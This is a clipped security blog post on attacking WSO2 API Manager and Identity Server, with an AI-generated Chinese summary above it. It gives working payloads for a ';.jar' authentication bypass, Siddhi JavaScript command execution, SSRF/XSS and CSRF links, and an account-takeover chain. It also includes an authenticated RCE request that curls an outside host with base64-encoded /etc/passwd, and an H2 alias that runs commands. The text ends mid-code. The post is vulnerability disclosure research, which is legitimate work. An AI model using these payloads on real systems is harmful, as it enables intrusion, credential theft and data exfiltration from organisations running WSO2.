---
title: Lexfo's security blog - Attacking WSO2 Products
source: https://blog.lexfo.fr/wso2.html
source_host: blog.lexfo.fr
clip_date: 2026-09-09T10:46:50+08:00
trace_id: 6680f906-97e7-4994-b623-cb0dd8e6ddee
content_hash: ed1031188551a790c815cc622bf015a6bfd2d1252be479e34c8b5f35431217ac
status: summarized
tags:
  - 漏洞分析
  - WSO2
series: null
feed_source: Lexfo
ai_summary: WSO2 多个产品（API Manager/Identity Server）暴露严重漏洞链，包括未授权 RCE、认证绕过、SSRF、CSRF、账号接管及多种认证后 RCE；其中大部分至今未修复，仅 Siddhi SOAP RCE 获得 CVE-2025-5717。
ai_summary_style: key-points
images_status:
  total: 16
  succeeded: 16
  failed_urls: []
notion_page_id: null
ioc:
  cves:
    - CVE-2022-29464
    - CVE-2024-6914
    - CVE-2024-7097
    - CVE-2025-5717
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> WSO2 多个产品（API Manager/Identity Server）暴露严重漏洞链，包括未授权 RCE、认证绕过、SSRF、CSRF、账号接管及多种认证后 RCE；其中大部分至今未修复，仅 Siddhi SOAP RCE 获得 CVE-2025-5717。
> 
> - **指纹特征：** `GET /services/Version` 可返回产品名与版本；登录页版权年份与 `Server: WSO2 Carbon Server` 头也可辅助识别。`/carbon` 管理控制台与 `/services` SOAP 服务是主要攻击面，默认账号常为 `admin:admin`。
> - **认证绕过技巧：** 共享中间件仅对 URI 做 `.jar`/`.class` 扩展名校验，而路由按文件名处理，访问 `/carbon/MyAdminPage.jsp;.jar` 即可绕过 ACL 访问管理页面；WSO2 还允许 POST 参数转 GET 传入，可直接绕过 CSRF Token。
> - **未授权 RCE/SSRF/CSRF：** 部分版本可利用 `;.jar` 绕过并访问 Siddhi 执行页面，通过 ScriptEngine/Nashorn 直接调 `Runtime.exec()`；`WSRequestXSSproxy_ajaxprocessor.jsp` 在所有版本可未授权访问，提供近乎完全可控的 HTTP 请求 SSRF，也能回传 text/html 形成 XSS；SOAP 管理服务仅凭 URL 参数即可消费，关键端点可被 CSRF 触发。
> - **账号接管链：** CVE-2024-7097 允许自助注册低权限用户；CVE-2024-6914 中，当目标用户未配置安全问题（如 `admin`）时，`verifyUserChallengeAnswers` 传入空答案数组会因 `0==0` 被判定通过，随后用 token 调 `updatePassword` 即可重置密码。
> - **认证后 RCE 路径：** CVE-2025-5717 可通过 `EventProcessorAdminService/deployExecutionPlan` 部署恶意 Siddhi 计划执行命令并持久化；`NDataSourceAdmin/testDataSourceConnection` 可连接任意 JDBC，H2 的 `CREATE ALIAS` 实现错误回显 RCE，SQLite 驱动可在 webapps 目录写出 `.jsp` 数据库文件作为 webshell；API Manager 的 RhinoJS/`APIGatewayAdmin/addApi` 可部署命令执行 API；内网 JMX/RMI（端口 9999/11111、默认 `admin:admin`）也可用 beanshooter 完成 RCE。

WSO2 is a software provider offering multiple enterprise products, including the WSO2 API Manager for API lifecycle management and WSO2 Identity Server for authentication and authorization. These products share a common codebase and administration interfaces, which are often referred to as the "Carbon kernel".

Ambionics Security is a LEXFO service that provides continuous penetration testing, weekly counter-audits, and active threat monitoring. During our assessments, we identified several WSO2 instances exposed on the Internet. We investigated these exposed instances for both known vulnerabilities and new attack methods.

This investigation revealed:

-   Multiple Remote Code Execution paths
-   Multiple authentication bypasses enabling exploitation of authenticated vulnerabilities
-   Server-Side Request Forgery (SSRF) attacks with full request control
-   Cross-Site Scripting (XSS) attacks
-   Cross-Site Request Forgery (CSRF) attacks

This article focuses on two flagship products:

-   **API Manager** - API lifecycle management platform
-   **Identity Server** - IAM solution for authentication/authorization

While examining known vulnerabilities, we discovered new weaknesses in WSO2's shared codebase that affect multiple products. This article demonstrates how these flaws allow attackers to obtain remote-code-execution even on hardened installations.

## A. Reconnaissance on WSO2 products

Before diving into the vulnerabilities, it's crucial to understand how to identify WSO2 deployments and map their attack surface. WSO2 products have several distinct entry points that can be leveraged for reconnaissance and exploitation.

## 1\. Fingerprinting

WSO2 products can be identified by probing the `Version` service endpoint:

```
GET /services/Version HTTP/1.1
Host: target-host
```

A WSO2 instance will typically respond with XML containing the product name and version:

```
HTTP/1.1 200 OK
Content-Type: application/xml; charset=UTF-8

<ns:getVersionResponse xmlns:ns="http://version.services.core.carbon.wso2.org">
  <return>WSO2 API Manager-4.4.0</return>
</ns:getVersionResponse>
```

This information immediately reveals which WSO2 product is running and its version, allowing an attacker to determine applicable vulnerabilities. Note that this service isn't available in some products like WSO2 Identity Server.

When the `Version` service is unavailable, the product release year can often be estimated from the copyright banner displayed on the Carbon Management Console login page:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/de26fef1ca61871f.png)

Release year displayed in the administration console login page

The mere presence of a WSO2 product can be revealed by checking for the characteristic server header:

```
HTTP/1.1 200 OK
Server: WSO2 Carbon Server
```

## 2\. Primary attack surfaces

WSO2 products expose two main entry points that are of particular interest:

## Carbon Management Console (/carbon)

The Carbon Management Console is the administrative interface used across most WSO2 products. It provides access to configuration settings, user management, and various administrative functions. By default, it's accessible at:

```
https://target-host/carbon/
```

Default credentials are `admin:admin`, though these may be changed in production environments. Many of the vulnerabilities described in this article target this interface.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/6dcfc60ce98c03ac.png)

Carbon Management Console

## SOAP services (/services)

WSO2 exposes numerous SOAP web services under the `/services` path. These services power both the administrative console and the core product functionality. Many of these endpoints may be accessible without proper authentication, and identifying available services is crucial for understanding the attack surface.

### Hidden services

To discover all deployed services, download a matching WSO2 release from the [official site](https://wso2.com/api-manager/previous-releases/), start the server with the OSGi console enabled (`-DosgiConsole`), and run the `listHiddenServices` command:

```bash
osgi> listHiddenServices
Hidden services deployed on this server:
1. ModuleAdminService, ModuleAdminService, https://<hostname>:8243/services/ModuleAdminService 
2. __MultitenantDispatcherService, null, http://<hostname>:8280/services/__MultitenantDispatcherService https://<hostname>:8243/services/__MultitenantDispatcherService local:///services/__MultitenantDispatcherService/ 
3. EventStatisticsAdminService, EventStatisticsAdminService, https://<hostname>:8243/services/EventStatisticsAdminService 
4. ThemeMgtService, ThemeMgtService, https://<hostname>:8243/services/ThemeMgtService 
5. RemoteUserRealmService, RemoteUserRealmService, https://<hostname>:8243/services/RemoteUserRealmService 
6. Product, null, https://<hostname>:8243/services/Product 
7. EventPublishService, EventPublishService, http://<hostname>:8280/services/EventPublishService https://<hostname>:8243/services/EventPublishService 
8. echo, echo, https://<hostname>:8243/services/echo http://<hostname>:8280/services/echo 
9. Document, null, https://<hostname>:8243/services/Document 
10. I18nEmailMgtConfigService, I18nEmailMgtConfigService, https://<hostname>:8243/services/I18nEmailMgtConfigService 
11. ListMetadataService, ListMetadataService, https://<hostname>:8243/services/ListMetadataService 
12. PropertiesAdminService, PropertiesAdminService, https://<hostname>:8243/services/PropertiesAdminService 
13. APILocalEntryAdmin, APILocalEntryAdmin, https://<hostname>:8243/services/APILocalEntryAdmin 
14. AndesEventAdminService, AndesEventAdminService, https://<hostname>:8243/services/AndesEventAdminService 
15. RemoteUserStoreManagerService, RemoteUserStoreManagerService, https://<hostname>:8243/services/RemoteUserStoreManagerService 
16. LogViewer, LogViewer, https://<hostname>:8243/services/LogViewer 
17. SearchAdminService, SearchAdminService, https://<hostname>:8243/services/SearchAdminService 
18. FunctionLibraryManagementAdminService, FunctionLibraryManagementAdminService, https://<hostname>:8243/services/FunctionLibraryManagementAdminService 
19. ws-xacml, ws-xacml, https://<hostname>:8243/services/ws-xacml 
20. RedirectorServletService, RedirectorServletService, https://<hostname>:8243/services/RedirectorServletService 
21. CustomMeteringService, CustomMeteringService, https://<hostname>:8243/services/CustomMeteringService 
22. UserAdmin, UserAdmin, https://<hostname>:8243/services/UserAdmin 
23. UserStoreConfigAdminService, UserStoreConfigAdminService, https://<hostname>:8243/services/UserStoreConfigAdminService 
24. TaskAdmin, TaskAdmin, https://<hostname>:8243/services/TaskAdmin 
25. RegistryCacheInvalidationService, RegistryCacheInvalidationService, https://<hostname>:8243/services/RegistryCacheInvalidationService 
26. ServerAdmin, ServerAdmin, https://<hostname>:8243/services/ServerAdmin 
27. RelationAdminService, RelationAdminService, https://<hostname>:8243/services/RelationAdminService 
28. ConfigServiceAdmin, ConfigServiceAdmin, https://<hostname>:8243/services/ConfigServiceAdmin 
29. PackageInfoService, PackageInfoService, https://<hostname>:8243/services/PackageInfoService 
...
```

### Listing services

On an actual production deployment, some services might be unavailable. To map your attack surface, you can enumerate available endpoints using an error-based approach:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bd67f8c4ae1d6185.png)

403 error on an existent service

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/cbb5a7626cf8f604.png)

404 error on a non-existent service

### User permissions

Each SOAP service and method requires a specific permission string, for example:

-   `/permission/admin/login`: authenticated users
-   `/permission/admin`: administrators

You can list these permission requirements using the `listSystemServicesInfo` command:

```swift
osgi> listSystemServicesInfo

All System services deployed on this server.

1. ModuleAdminService, AdminService, HiddenService, https://<hostname>:8243/services/ModuleAdminService, Permission - /permission/admin/manage/modify/module
    disengageModuleFromSystem(), Permission - /permission/admin/manage/modify/module
    listModulesForOperation(), Permission - /permission/admin/manage/modify/service
    listGloballyEngagedModules(), Permission - /permission/admin/manage/modify/module
    listModulesForService(), Permission - /permission/admin/manage/modify/service
    globallyEngageModule(), Permission - /permission/admin/manage/modify/module
    globallyDisengageModule(), Permission - /permission/admin/manage/modify/module
    disengageModuleForOperation(), Permission - /permission/admin/manage/modify/service
    removeModule(), Permission - /permission/admin/manage/modify/module
    listModules(), Permission - /permission/admin/manage/modify/module
    engageModuleForServiceGroup(), Permission - /permission/admin/manage/modify/service
    getModuleInfo(), Permission - /permission/admin/manage/modify/module
    engageModuleForService(), Permission - /permission/admin/manage/modify/service
    disengageModuleForServiceGroup(), Permission - /permission/admin/manage/modify/service
    removeModuleParameter(), Permission - /permission/admin/manage/modify/module
    uploadModule(), Permission - /permission/admin/manage/modify/module
    setModuleParameters(), Permission - /permission/admin/manage/modify/module
    disengageModuleForService(), Permission - /permission/admin/manage/modify/service
    engageModuleForOperation(), Permission - /permission/admin/manage/modify/service
    getModuleParameters(), Permission - /permission/admin/manage/modify/module
    listModulesForServiceGroup(), Permission - /permission/admin/manage/modify/service

2. __MultitenantDispatcherService, HiddenService, http://<hostname>:8280/services/__MultitenantDispatcherServicehttps://<hostname>:8243/services/__MultitenantDispatcherServicelocal:///services/__MultitenantDispatcherService/
    dispatch()

3. EventStatisticsAdminService, AdminService, HiddenService, https://<hostname>:8243/services/EventStatisticsAdminService, Permission - /permission/admin/monitor/event-streams
    getElementCount(), Permission - /permission/admin/monitor/event-streams
    getGlobalCount(), Permission - /permission/admin/monitor/event-streams
    getCategoryCount(), Permission - /permission/admin/monitor/event-streams
    getDeploymentCount(), Permission - /permission/admin/monitor/event-streams

4. ThemeMgtService, AdminService, HiddenService, https://<hostname>:8243/services/ThemeMgtService
    getSessionResourcePath(), Permission - /permission/admin/configure/theme
    getResourceTreeEntry(), Permission - /permission/admin/configure/theme
    getMetadata(), Permission - /permission/admin/configure/theme
    applyTheme(), Permission - /permission/admin/configure/theme
    getTextContent(), Permission - /permission/admin/configure/theme
    getResourceData(), Permission - /permission/admin/configure/theme
    getCollectionContent(), Permission - /permission/admin/configure/theme
    delete(), Permission - /permission/admin/configure/theme
    getAllPaths(), Permission - /permission/admin/configure/theme
    getAllThemes(), Permission - /permission/admin/configure/theme
    getContentBean(), Permission - /permission/admin/configure/theme
    renameResource(), Permission - /permission/admin/configure/theme
    addTextResource(), Permission - /permission/admin/configure/theme
    importResource(), Permission - /permission/admin/configure/theme
    addResource(), Permission - /permission/admin/configure/theme
    addCollection(), Permission - /permission/admin/configure/theme
    updateTextContent(), Permission - /permission/admin/configure/theme
    getContentDownloadBean(), Permission - /permission/admin/configure/theme

5. RemoteUserRealmService, AdminService, HiddenService, https://<hostname>:8243/services/RemoteUserRealmService, Permission - /permission/protected/tenant-admin
    getRealmConfiguration(), Permission - /permission/protected/tenant-admin

6. Product, AdminService, HiddenService, https://<hostname>:8243/services/Product, Permission - /permission/admin/login
    getProduct(), Permission - /permission/admin/manage/resources/govern/product/list
    getProductArtifactIDs(), Permission - /permission/admin/manage/resources/govern/product/list
    getProductDependencies(), Permission - /permission/admin/manage/resources/govern/product/list
    addProduct(), Permission - /permission/admin/manage/resources/govern/product/add
    updateProduct(), Permission - /permission/admin/manage/resources/govern/product/add
    deleteProduct(), Permission - /permission/admin/manage/resources/govern/product/add

7. EventPublishService, HiddenService, http://<hostname>:8280/services/EventPublishServicehttps://<hostname>:8243/services/EventPublishService, Permission - /permission/admin/manage/event
    publish(), Permission - /permission/admin/manage/event


9. Document, AdminService, HiddenService, https://<hostname>:8243/services/Document, Permission - /permission/admin/login
    getDocumentDependencies(), Permission - /permission/admin/manage/resources/govern/document/list
    getDocumentArtifactIDs(), Permission - /permission/admin/manage/resources/govern/document/list
    addDocument(), Permission - /permission/admin/manage/resources/govern/document/add
    getDocument(), Permission - /permission/admin/manage/resources/govern/document/list
    deleteDocument(), Permission - /permission/admin/manage/resources/govern/document/add
    updateDocument(), Permission - /permission/admin/manage/resources/govern/document/add

...
```

To view your current user's permissions, call the `LoggedUserInfoAdmin/getUserInfo` SOAP endpoint:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/266f6e959f58e08f.png)

getUserInfo output

### Service definitions

To dump WSDLs and definitions for all admin services, use the `dumpAdminServices` command:

```
osgi> dumpAdminServices
Admin service info dump created at /wso2am-4.5.0/tmp/adminServices
```

## B. Unauthenticated vulnerabilities

## 1\. Arbitrary file upload (CVE-2022-29464)

This patched unauthenticated RCE (as documented in [this writeup](https://github.com/hakivvi/CVE-2022-29464)) served as WSO2's main exploitation vector.

We developed our own [exploit](https://github.com/ambionics/wso2-exploits/tree/main/rce/unauthenticated/CVE-2022-29464) to address version-specific limitations of existing exploits.

## 2\. Authentication bypass

In an authentication-related middleware from the shared codebase, the following line of code was identified:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/79318ca04bc442af.png)

Flawed file extension check

The middleware allows unauthenticated access to any `.jar` and `.class` files. This validation is flawed - the file extension check is performed on the URI, but the actual routing is performed on the filename.

```
https://example.com/path/resource.jsp;param1=value1?query=value#fragment
|______|  |_________|  |_____________| |________| |_________| |_______|
   |          |              |              |          |         |
Protocol    Host           Path       Matrix Param    Query    Fragment
                                          |
                     The vulnerability exists here - security check looks
                     at the whole URI, but routing only uses path portion
```

The query part and fragment are removed from the URI by the HTTP server. However, the "matrix parameters" (also called "path parameters") are kept, so for such an URL:

-   `http://localhost:9443/carbon/MyAdminPage.jsp;.jar`

This authentication check sees the following URI:

-   `/carbon/MyAdminPage.jsp;.jar`

However, when the webserver needs to decide what [servlet](https://en.wikipedia.org/wiki/Jakarta_Servlet) to send the request to, it uses the filename, so it only sees:

-   `MyAdminPage.jsp`

This is a common case of ACL bypass due to path processing inconsistencies.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bf34c3a2b920c9fb.png)

Path validation table from a 2017 Orange Tsai presentation

Appending `;.jar` to any carbon administration console JSP file allows accessing the page, bypassing this middleware:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/63391e21aff89d6c.png)

Unauthenticated access to a management console page

However, this authentication bypass is actually very limited. As mentioned before, the management console is just a frontend to the SOAP services, so every underlying call to an internal service needs to be properly authenticated, otherwise an error is thrown:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/070f25bd70091cd3.png)

Authenticated Axis2 service usage inside a JSP page

The attack surface we are sure to be reachable is the one implemented directly in the JSP code of the page itself, as these features do not rely on internal authenticated services.

Available pages depend on the WSO2 product but also its specific versions, as features available in the management console vary drastically depending on the version.

We reviewed the accessible pages within WSO2 API Manager and Identity Server and identified several pages that posed significant risks. In one version, an unauthenticated Remote Code Execution vulnerability was discovered.

## 3\. RCE via Siddhi Streaming SQL

[Siddhi Streaming SQL](https://siddhi.io/en/v4.x/docs/query-guide/) is a domain-specific language developed specifically for WSO2. It is designed to process events in a " [streaming manner](https://siddhi.io/en/v4.x/docs/query-guide/#:~:text=streams%20in%20a-,streaming%20manner,-%2C%20detect%20complex%20event) ".

The set of rules defining how an event should be processed is called a Siddhi Execution Plan, or Siddhi Application. It usually defines an input stream, from which events are received (e.g.: Kafka), a processing query, which might transform the input events using various means, and an output sink (e.g.: a logging server).

Many dangerous features are available to Siddhi Execution Plans, one of them is the ability to define and execute [arbitrary JavaScript functions](https://apim.docs.wso2.com/en/4.1.0/use-cases/examples/streaming-examples/script-js-sample/)

### JavaScript in Java: The ScriptEngine API

Java has long included its own JavaScript implementation through [ScriptEngine](https://docs.oracle.com/javase/8/docs/api/javax/script/ScriptEngine.html), Java's implementation is a pure Java interpretation of the ECMAScript specification. This implementation, known as Nashorn, allows JavaScript code to be executed directly within Java applications.

The ScriptEngine provides a bridge between JavaScript and Java, enabling JavaScript code to call Java methods and access Java classes directly. This tight integration means that JavaScript running in a Java environment has full access to the underlying Java runtime, including potentially dangerous operations like file system access and process execution.

Crucially, this JavaScript execution occurs without the protection of a sandbox by default. While this provides powerful integration capabilities, it also means that any JavaScript code executed through [ScriptEngine](https://docs.oracle.com/javase/8/docs/api/javax/script/ScriptEngine.html) can potentially perform arbitrary Java operations, leading to security vulnerabilities if untrusted code is executed.

This direct access to Java classes is what enables the remote code execution demonstrated in the following example. The JavaScript function can call Java's `Runtime.exec()` method directly, allowing execution of system commands on the server.

The following Siddhi Javascript function allows the execution of the command `id`:

```typescript
define function myexec[JavaScript] return string {{
    java.lang.Runtime.getRuntime().exec(["/bin/sh", "-c", "id"]);
return "";
}};
```

ScriptEngine has been [removed since Java 17](https://openjdk.org/jeps/372). However, depending on the specific instance configuration, other languages might be available, such as [Scala](https://central.sonatype.com/artifact/org.wso2.extension.siddhi.script.scala/siddhi-script-scala), [Python](https://siddhi.io/en/v4.x/docs/siddhi-as-a-python-library/), or [R](https://github.com/wso2-extensions/siddhi-gpl-execution-r)

## Un-authenticated Siddhi execution (RCE)

In some versions, the partial authentication bypass allows attackers to reach a page that enables users to execute arbitrary Siddhi Execution Plans.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/533910ad004ac92a.png)

Arbitrary Siddhi execution

This page allows specifying an arbitrary execution plan, as well as input events, which is exactly what is needed to have a malicious function executed.

This page is normally authenticated, trying to access it without session cookies will result in a "403 Forbidden error":

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0e90824ea048046a.png)

Rejected unauthenticated access

However, using the `;.jar` trick we discussed earlier, full access to this feature is granted:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/56915a5aa9500ab6.png)

Authentication bypass by appending;.jar to the URL path

Here, we also used another "trick", we switched the "POST" to a "GET" request, and passed the body parameters as URL parameters, this avoids the need for a CSRF token.

WSO2 products usually allow any POST request to also be passed as GET. This is very convenient but also completely unsecure as it allows bypassing all CSRF protections, which means that basically all endpoints in the carbon console are vulnerable to CSRF attacks.

Let's get back to exploiting the Siddhi execution, the following execution plan can be used to execute the command `id` on each input event:

```typescript
@Plan:name('RCEExecutionPlan')
define stream RCEStream (_ string);

@sink(type='log')
define stream logStream (_ string, output string);

define function RCEFunc[JavaScript] return string {
     // Execute the command and capture the output
     var process = java.lang.Runtime.getRuntime().exec(["sh", "-c", "id"]);
     var reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
     var output = "";
     var line = reader.readLine();
     while (line != null) {
         output += line + "\n";
         line = reader.readLine();
     }

     reader.close();
     return output;
};

from RCEStream select _, RCEFunc(_) as output 
insert into bridgeStream;

from bridgeStream
select *
insert into logStream;
```

The command output will be displayed inside the web page:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d966fdfcfe74967a.png)

Arbitrary command execution

This page was only found to be present in WSO2 API-Manager before v2.6.0, though it might be available in other WSO2 products that were not evaluated during our assessment.

## 4\. SSRF with full request control

In all WSO2 products assessed across all versions, the file [WSRequestXSSproxy_ajaxprocessor.jsp](https://github.com/kasunbg/carbon-kernel-4.x/blob/master/core/org.wso2.carbon.ui/src/main/resources/web/admin/jsp/WSRequestXSSproxy_ajaxprocessor.jsp) was found to be accessible by bypassing authentication using the `;.jar` trick [described earlier](#2-authentication-bypass). This file offers a proxy for HTTP requests and allows almost full control of the request's content and target. By passing Axis2 options, an attacker can submit parameters as URL-encoded, multipart, JSON, or XML forms using any HTTP method they choose. They can also pass credentials which will be transmitted as Basic Authorization. However, only XML responses can be returned to the client.

Server-Side Request Forgery (SSRF) vulnerabilities typically allow attackers to make requests from the server to other internal systems. In most cases, attackers can only control the target URL. However, this particular SSRF provides nearly complete control over the HTTP request, including headers, parameters, and body content. This significantly increases its exploitation potential, enabling advanced attacks that wouldn't be possible with a typical SSRF vulnerability.

This SSRF vulnerability is particularly powerful as it can be used in two ways: to attack other services in the internal network, and to target the WSO2 instance itself on localhost. For example, if the SOAP Administration services are not exposed via the `/services` route, the SSRF can be used to reach the internal Passthrough port (8280) which exposes them. This allows exploiting many vulnerabilities that will be discussed further.

The `WSRequestXSSproxy_ajaxprocessor.jsp` can also be used to deliver XSS payloads to a user, as the response served by the proxy uses the content-type text/html. An attacker can craft a link to `WSRequestXSSproxy_ajaxprocessor.jsp` that will fetch an XSS payload from an attacker-controlled server and deliver it to the user as HTML. For example, this file:

```html
<?xml version="1.0"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://example.org/webservice">
   <soapenv:Header/>
   <soapenv:Body>
      <web:Response>
        <script>alert(1)</script>
      </web:Response>
   </soapenv:Body>
</soapenv:Envelope>
```

Will be returned as text/html to the user, and an alert popup will be displayed.

A Python script to exploit this SSRF vulnerability is available [here](https://github.com/ambionics/wso2-exploits/tree/main/ssrf).

## 5\. Cross-Site Request Forgery

Although SOAP services typically expect XML by definition, WSO2 tries to be Content-Type agnostic. This means parameters can also be passed as URL parameters, POST url-encoded forms, or JSON. This was found to have the unexpected side-effect of enabling CSRF attacks on critical endpoints.

The Siddhi execution features explored earlier can also be exploited in the SOAP services through CSRF. A malicious execution plan like the following:

```typescript
@Plan:name('RCEExecutionPlan')

define trigger StartupTrigger at 'start';

define function myexec[JavaScript] return string {
 java.lang.Runtime.getRuntime().exec(["/bin/sh", "-c", "curl http://ambionics.io:2727?$(base64 -w0 /etc/passwd)"]);
    return "";
};

@Sink(type='log', prefix='')

define stream StartupLogStream (executionResult String);
from StartupTrigger

select myexec(1) as executionResult
insert into StartupLogStream;
```

Can be executed if a legitimate user clicks on this URL:

```bash
https://victim.com/services/EventProcessorAdminService/deployExecutionPlan?executionPlan=%40Plan%3aname('RCEExecutionPlan')%0d%0adefine%20trigger%20StartupTrigger%20at%20'start'%3b%0d%0adefine%20function%20myexec%5bJavaScript%5d%20return%20string%20%7b%0d%0a%20java.lang.Runtime.getRuntime().exec(%5b%22%2fbin%2fsh%22%2c%20%22-c%22%2c%20%22curl%20http%3a%2f%2fambionics.io%3a2727%3f%24(base64%20-w0%20%2fetc%2fpasswd)%22%5d)%3b%0d%0areturn%20%22%22%3b%0d%0a%7d%3b%0d%0a%40Sink(type%3d'log'%2c%20prefix%3d'')%0d%0adefine%20stream%20StartupLogStream%20(executionResult%20String)%3b%0d%0afrom%20StartupTrigger%0d%0aselect%20myexec(1)%20as%20executionResult%0d%0ainsert%20into%20StartupLogStream%3b 
```

The details of Siddhi execution via SOAP services will be discussed in the [authenticated vulnerabilities section](#1-siddhi-rce-via-soap-administration-services).

Most SOAP Administration services can be fully consumed using only URL parameters, making them vulnerable to CSRF attacks.

## C. Account takeover

Beyond unauthenticated bugs, ZDI disclosed a full account-takeover chain ([CVE-2024-7097](https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3574/) & [CVE-2024-6914](https://blog.lexfo.fr/\(https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3561/\))) requiring no user interaction. While ZDI did not publish any exploitation details, we examined the patches provided by WSO2 in their open-source repository and built working exploits for both vulnerabilities.

## 1\. Self-Registration (CVE-2024-7097)

An unprivileged user can be created via the `UserRegistrationAdminService`:

```html
POST /services/UserRegistrationAdminService.UserRegistrationAdminServiceHttpsSoap11Endpoint HTTP/1.1
SOAPAction: urn:addUser
Content-Type: text/xml;charset=UTF-8
Host: victim.com
Content-Length: 531

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:xsd="http://org.apache.axis2/xsd">
    <soapenv:Header/>
    <soapenv:Body>
        <xsd:addUser>
<xsd:user>
            <xsd:userName>eviluser</xsd:userName>
            <xsd:password>evilpass</xsd:password>
</xsd:user>
        </xsd:addUser>
    </soapenv:Body>
</soapenv:Envelope>
```

## 2\. Flawed password reset process (CVE-2024-6914)

The `UserInformationRecoveryService` orchestrates password resets via four SOAP calls:

1.  `verifyUser(username)`
    -   Starts the recovery session and issues a token
2.  `getUserChallengeQuestions(username, token)`
    -   Returns configured questions (might be zero)
3.  `verifyUserChallengeAnswers(answers[], token)`
    -   Marks the token verified if the number of correct answers equals the number of questions
4.  `updatePassword(username, newPassword, token)`
    -   Allows the reset only if the token is verified

In the original `verifyUserChallengeAnswers`, the check:

```
if (storedQuestions.length == count) {
    verification = true;
}
```

passes when both sides are zero—i.e. no questions and no answers—incorrectly granting verification.

The vendor's patch simply injects a guard to reject the zero-answer case before the length check:

```
                }
            }

+            if (count == 0) {
+                verification = false;
+            }

            if (verification) {
                verification = (storedUserChallengeDTOs.length == count);
            }
```

An attacker abuses this by calling `verifyUserChallengeAnswers` with an empty answer set for a user who has no questions (e.g. `admin`), then immediately invoking `updatePassword` with the token to reset the password without supplying any answers. With the new admin password, they gain full access to SOAP admin services, the `/carbon` console, and any internal RMI endpoints.

The original `admin` password can be found in plaintext in the `repository/conf/user-mgt.xml` configuration file. After a successful exploitation, this password must be restored.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ee7b6e390518902f.png)

Plaintext admin password in configuration files

The same password-reset exploit can be used to revert the password to its original value.

> **⚠️ WSO2 applications will fail to start if the admin password is different than the one configured in the user-mgt.xml file**

## D. Authenticated RCE vulnerabilities

The vulnerabilities related to the Siddhi RCE and the arbitrary file upload are unlikely to be exploitable on most targets, as they are likely patched or unavailable. However, there are multiple authenticated vulnerabilities that can be leveraged to escalate to RCE if an attacker gains access to an account.

## 1\. Siddhi RCE via SOAP administration services (CVE-2025-5717)

Siddhi executes queries when processing an event. A "trigger" event can be defined to execute at specific time periods using a cron expression, or at the execution plan deployment using the `start` expression.

```bash
POST /services/EventProcessorAdminService HTTP/1.1
Host: vulnerable-host:8243
Content-Type: text/xml; charset=utf-8
SOAPAction: urn:deployExecutionPlan
Authorization: Basic <creds>

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:ns="http://admin.processor.event.carbon.wso2.org">
   <soapenv:Header/>
   <soapenv:Body>
      <ns:deployExecutionPlan>
         <ns:executionPlan><![CDATA[
@Plan:name('RCEExecutionPlan')
define trigger StartupTrigger at 'start';
define function myexec[JavaScript] return string {
 java.lang.Runtime.getRuntime().exec(["/bin/sh", "-c", "curl http://ambionics.io:2727?$(base64 -w0 /etc/passwd)"]);
return "";
};
@Sink(type='log', prefix='')
define stream StartupLogStream (executionResult String);

from StartupTrigger
select myexec(1) as executionResult
insert into StartupLogStream;
]]></ns:executionPlan>
         <ns:tenantId>-1234</ns:tenantId>
      </ns:deployExecutionPlan>
   </soapenv:Body>
</soapenv:Envelope>
```

This enables blind command execution. An attacker could also deploy a malicious execution plan that triggers an event periodically to maintain persistence on the compromised server.

An exploit script for this Siddhi SOAP RCE vulnerability is available [here](https://github.com/ambionics/wso2-exploits/tree/main/rce/authenticated/siddhi-rce).

This vulnerability was assigned [CVE-2025-5717](https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2025/WSO2-2025-4119/)

## 2\. RCE via Data-sources admin service

The `NDataSourceAdmin` service's `testDataSourceConnection` method allows attackers to connect to arbitrary JDBC URIs and run SQL.

## RCE via H2 SQL

H2 is an in-memory database written entirely in Java, often used for embedded database applications. Like SQLite, it is lightweight and doesn't require a separate server process, but it is specifically designed for Java environments. This Java-native implementation gives H2 unique capabilities, including the ability to define and call Java methods directly from SQL queries. While this provides great flexibility for database operations, it also introduces significant security risks when untrusted code is executed.

One of H2's powerful features is its support for user-defined functions (UDFs) written in Java. These functions can be created using SQL's `CREATE ALIAS` syntax, allowing Java code to be executed whenever the function is called in a query. While this provides great flexibility for database operations, it also introduces significant security risks when untrusted code is executed.

The Java code in these UDFs runs with the same privileges as the database itself, meaning it has full access to the Java runtime environment. This includes the ability to execute system commands, access the file system, and perform other potentially dangerous operations.

The exploit consists of two main components. First, a SQL function is created in the H2 database to execute system commands and return their output. This function is then triggered through a SOAP request to the WSO2 admin service.

The following SQL creates a function called `EXEC_READ` that takes a command as its input, executes it on the system, and returns the output:

```java
DROP ALIAS IF EXISTS EXEC_READ;
CREATE ALIAS EXEC_READ AS $$
String execRead(String cmd) throws Exception {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    StringBuilder sb = new StringBuilder();
    String line;
    while ((line = br.readLine()) != null) {
        sb.append(line).append("\n");
    }
